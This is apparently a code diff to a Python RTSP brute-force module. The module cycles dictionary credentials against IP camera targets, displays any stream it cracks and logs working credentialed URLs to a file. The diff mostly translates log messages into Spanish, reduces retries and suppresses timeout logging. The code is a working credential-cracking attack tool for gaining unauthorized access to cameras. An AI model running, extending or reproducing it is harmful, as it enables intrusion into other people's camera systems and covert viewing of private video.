@@ -12,6 +12,7 @@ from tqdm import tqdm
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 class RTSPBruteModule:
+    
     def __init__(self):
         self.targets = []
         self.credentials = []
@@ -35,18 +36,18 @@ class RTSPBruteModule:
             with open(dictionary_file, 'r') as f:
                 return [line.strip() for line in f.readlines()]
         except FileNotFoundError:
-            logging.error(f"Dictionary file {dictionary_file} not found.")
+            logging.error(f"Archivo de diccionario {dictionary_file} not found.")
             return []
 
     def run(self):
         total_targets = len(self.targets)
-        logging.info(f"[*] Total targets: {total_targets}")
+        logging.info(f"[*] Objetivos totales: {total_targets}")
 
         queue_instance = self.generate_queue()
         tasks = []
 
         with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
-            with tqdm(total=self.total_combinations, desc="Progress", position=0, leave=True) as pbar:
+            with tqdm(total=self.total_combinations, desc="Progress", position=0, leave=True) as pbar:       
                 while not queue_instance.empty():
                     task = queue_instance.get()
                     future = executor.submit(self.brute_force, task)
@@ -100,7 +101,7 @@ class RTSPBruteModule:
             f"Proxy-Authorization: Digest username=\"{user}\", realm=\"\", nonce=\"\", uri=\"rtsp://{ip}:{port}/\", response=\"\"\r\n",
         ]
 
-        retries = 3
+        retries = 1
 
         for _ in range(retries):
             for auth in auth_methods:
@@ -122,18 +123,21 @@ class RTSPBruteModule:
                     url = f"rtsp://{credential}@{ip}:{port}/"
                     return self.display_camera(url)
                 except socket.timeout:
-                    logging.info(f"Timeout occurred. Retrying... (Attempts left: {retries - 1})")
+                    continue
+                    #logging.info(f"Timeout occurred. Retrying... (Attempts left: {retries - 1})")
                 except socket.error as e:
                     continue
 
             retries -= 1
-
         return False
 
     def display_camera(self, url):
+        ip = url.split('@')[1].split(':')[0]
+        logging.info(f"Intentando conectarse a {url}")
+
         cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
         if cap.isOpened():
-            logging.info(f"Displaying camera stream from {url}")
+            logging.info(f"Visualización de la transmisión de la cámara desde {url}")
             start_time = time.time()
             while time.time() - start_time < 10:
                 ret, frame = cap.read()
@@ -146,12 +150,12 @@ class RTSPBruteModule:
             self.save_url(url)
             return True
         else:
-            logging.error(f"Failed to open video stream from {url}")
-        return False
+            logging.error(f"No se pudo abrir la transmisión de video desde {url}")
+            return False
 
     def save_url(self, url):
         ip = url.split('@')[1].split(':')[0]
-        logging.info(f"Saving URL: {url}")
+        logging.info(f"Guardando URL: {url}")
         if not os.path.exists("RTSPCONECT.txt"):
             open("RTSPCONECT.txt", 'w').close()
 
@@ -179,5 +183,5 @@ class RTSPBruteModule:
         target, credential = task
         ip, port = target
         if not self.rtsp_request(target, credential):
-            logging.info(f"Failed login for {ip}:{port} with {credential}")
+            logging.info(f"Inicio de sesión fallido para {ip}:{port} con {credential}")
         time.sleep(self.pause_duration)
